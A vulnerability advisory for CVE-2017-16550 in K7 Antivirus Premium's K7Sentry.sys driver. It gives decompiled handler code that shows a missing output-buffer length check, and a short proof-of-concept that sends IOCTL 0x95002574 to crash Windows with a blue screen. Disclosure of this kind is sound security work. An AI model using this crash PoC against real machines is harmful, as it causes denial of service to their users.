# CVE-2017-16550

# Product / Component Affected

* **Product**: *K7 Antivirus Premium 15.1.0.53* 
* **Component**: *K7Sentry.sys 15.1.0.45*
  * SHA256: 7037F80EC73F4D6E2DFBD2AA675FF154F81AAB2FB7372680AAA1D2D41DB93771

# Details
The issue lies in the dispatch handler for the IRP_MJ_DEVICE_CONTROL (sub_00018FC0). The handler code for IoControlCode 0x95002570 does not check the length of the output buffer before using it and assigns a 4 byte value to the output buffer.

```C++
// Internal structure used in the driver to pass about the basic information needed
typedef struct _IO_CONTROL_BUFFER
{
    DWORD dwSize;
    DWORD dwInputBufferLength;
    PVOID pInputBuffer;
    DWORD dwOutputBufferLength;
    PVOID pOutputBuffer;
    PDWORD pdwIoStatusInformation;
    DWORD dwIoControlCode;
} IO_CONTROL_BUFFER, *PIO_CONTROL_BUFFER;


// This is filled in at the top of the dispatch handler
```

```C++
// Snippets of the handler routine

// Setting up the IO_CONTROL_BUFFER structure
IO_CONTROL_BUFFER stIoControlBuffer = {0};
stIoControlBuffer.dwSize = 32;
pIoStackLocation = (IO_STACK_LOCATION *)Irp->Tail.Overlay.CurrentStackLocation;
dwIoControlCode = pIoStackLocation->Parameters.DeviceIoControl.IoControlCode;
stIoControlBuffer.dwIoControlCode = dwIoControlCode;
stIoControlBuffer.dwInputBufferLength = pIoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
stIoControlBuffer.dwOutputBufferLength = pIoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
stIoControlBuffer.pdwIoStatusInformation = &Irp->IoStatus.Information;

if ( !(dwIoControlCode & 3) )
{
    pInputBuffer = (int *)Irp->AssociatedIrp.SystemBuffer;
    stIoControlBuffer.pInputBuffer = pInputBuffer;
    pOutputBuffer = (PVOID *)pInputBuffer;
    stIoControlBuffer.pOutputBuffer = pInputBuffer;
    goto LABEL_12;
}
if ( (dwIoControlCode & 3) != 3 )
{
    pOutputBuffer = (PVOID *)stIoControlBuffer.pOutputBuffer;
    goto LABEL_11;
}
pInputBuffer = (int *)pIoStackLocation->Parameters.DeviceIoControl.Type3InputBuffer;
stIoControlBuffer.pInputBuffer = pInputBuffer;
pOutputBuffer = (PVOID *)Irp->UserBuffer;
stIoControlBuffer.pOutputBuffer = Irp->UserBuffer;


// Snippet of the specific handler code.
switch (dwIoControlCode)
{
    // ...
    case 0x9500256C:
        if ( stIoControlBuffer.dwInputBufferLength < 4u || !pInputBuffer )
            goto LABEL_49;
        if ( dwOutLength_1 < 4 )
            goto LABEL_39;
        *pOutputBuffer = (PVOID)1;
        *v2 = 4;
        v9 = 0;
        goto LABEL_117;
    case 0x95002570:
        // See CVE-2017-16549
        goto LABEL_117;
    case 0x95002574:
        // At this point, no checks have been performed in the size of the output buffer...
        v9 = sub_15840(&stIoControlBuffer);
        goto LABEL_117;
    // ...
}

```

```C++
int __stdcall sub_15840(IoControlBuffer *pIoControlBuffer)
{
    // 
    PVOID v1; // eax
    bool v2; // zf
    PVOID v3; // eax

    GetVirusDefVersion(&g_pszVDefVersoin);
    word_4EFD4 = g_pszVDefVersoin;
    if ( dword_4F020 && !_InterlockedCompareExchange(&dword_4F024, 1, 0) )
    {
        // Some code, not relavent
    }
    *pIoControlBuffer->pdwIoStatusInformation = 4;

    // VULN: No check has been performed to ensure you can write 4 bytes to pOutputBuffer. Need 
    // to check dwOuputBufferSize is >= 4 before assigning 4 bytes to it.
    *(_DWORD *)pIoControlBuffer->pOutputBuffer = 0;
    return 0;
}
```


# PoC Code
This PoC will open a connection to the driver and call it with the approiate IOCTL code to geneate the crash.

```c++
HANDLE hDevice = CreateFileW(L"\\\\.\\k7sentry", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
if (hDevice != INVALID_HANDLE_VALUE)
{
    DeviceIoControl(hDevice, 0x95002574, (PVOID)arrInBuffer, 0, (PVOID)0xaaaaaaaa, 0, &dwBytesReturned, NULL);
}
```

On Windows XP, this will attempt to write the value 0 to *0xaaaaaaaa*.

On Windows 7 and above, this will attempt to write the value 0 to 0x00000000 and will cause a BSOD.
